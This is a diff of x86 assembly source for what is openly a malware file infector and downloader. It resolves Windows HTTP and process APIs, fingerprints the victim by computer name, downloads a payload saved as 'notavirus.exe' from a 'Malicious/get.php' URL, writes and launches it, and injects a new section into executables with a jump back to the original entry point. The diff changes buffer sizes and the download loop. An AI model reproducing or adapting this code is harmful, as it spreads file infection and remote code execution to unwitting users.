@@ -114,33 +114,7 @@ nop
 nop
 nop
 nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
+
 endPatcher:
 
 ; Jmp data
@@ -249,11 +223,11 @@ HttpConnect	dd	?
 HttpRequest	dd	?
 MaliciousFile	db	'notavirus.exe', 0
 MaliciousUrl	db	'M', 0, 'a', 0, 'l', 0, 'i', 0, 'c', 0, 'i', 0, 'o', 0, 'u', 0, 's', 0, '/', 0, 'g', 0, 'e', 0, 't', 0, '.', 0, 'p', 0, 'h', 0, 'p', 0, '?', 0, 'n', 0, 'a', 0, 'm', 0, 'e', 0, '=', 0
-MaliciousUrl2	db	'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+MaliciousUrl2	db	'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
 MaliciousDomain	db	'l',0,'o',0,'c',0,'a',0,'l',0,'h',0,'o',0,'s',0,'t',0,0,0
 ; MaliciousDomain	db	"www.rmonnerat.olympe.in", 0
-ComputerName	db	"XXXXXXXXXX", 0
-LengthName	dd	10
+ComputerName	db	"XXXXXXXXXXXXXXXXXXXX", 0
+LengthName	dd	?
 VolumeID	dd	?
 _SYSTEMTIME	STRUC
 Year		dw	?
@@ -357,6 +331,7 @@ GETADDR	sCreateProcess, pKernel32, pCreateProcess
 GETADDR	sCreateThread, pKernel32, pCreateThread
 GETADDR	sWaitForSingleObject, pKernel32, pWaitForSingleObject
 
+
 ; Create Thread to avoid waiting injection & downloading
 PVDELTA	pCloseHandle
 PVDELTA	pExitProcess
@@ -373,9 +348,9 @@ call	[DELTA pCreateThread]
 ; cmp	eax, 0
 ; jne	errorExit
 
-
 ; WE ARE HERE MASTER ! COME GET ME !
 ; Get pseudo unique ids
+mov	[DELTA LengthName], 10
 PDELTA	LengthName
 PDELTA	ComputerName
 call	[DELTA pGetComputerName]
@@ -501,8 +476,8 @@ mov	[DELTA PeFile], eax
 ; Create malicious file downloaded
 copyToFile:
 PDELTA	Number
-push	70
-PDELTA	MaliciousUrl
+push	100
+PDELTA	MaliciousUrl2
 PVDELTA	HttpRequest
 call	[DELTA pWinHttpReadData]
 cmp	eax, 0
@@ -510,13 +485,13 @@ je	injectFiles
 push	0
 PDELTA	LengthName
 PVDELTA	Number
-PDELTA	MaliciousUrl
+PDELTA	MaliciousUrl2
 PVDELTA	PeFile
 call	[DELTA pWriteFile]
 cmp	eax, 0
 je	injectFiles
 mov	eax, [DELTA Number]
-cmp	eax, 70
+cmp	eax, 100
 je	copyToFile
 launchMalicious:
 
@@ -922,8 +897,6 @@ stosb
 loop	createNewSection
 
 ; CREATING JUMP TO OLD ENTRY POINT
-mov	eax, [DELTA OldEntryPoint] ; Entry point address
-sub	eax, [DELTA VirtualAddress]
 mov	edi, threadProgram - toInject ; Offset jmp
 add	edi, [DELTA PeFileMap] ; Add base filemap
 add	edi, [DELTA PointerToRawData] ; Add section offset
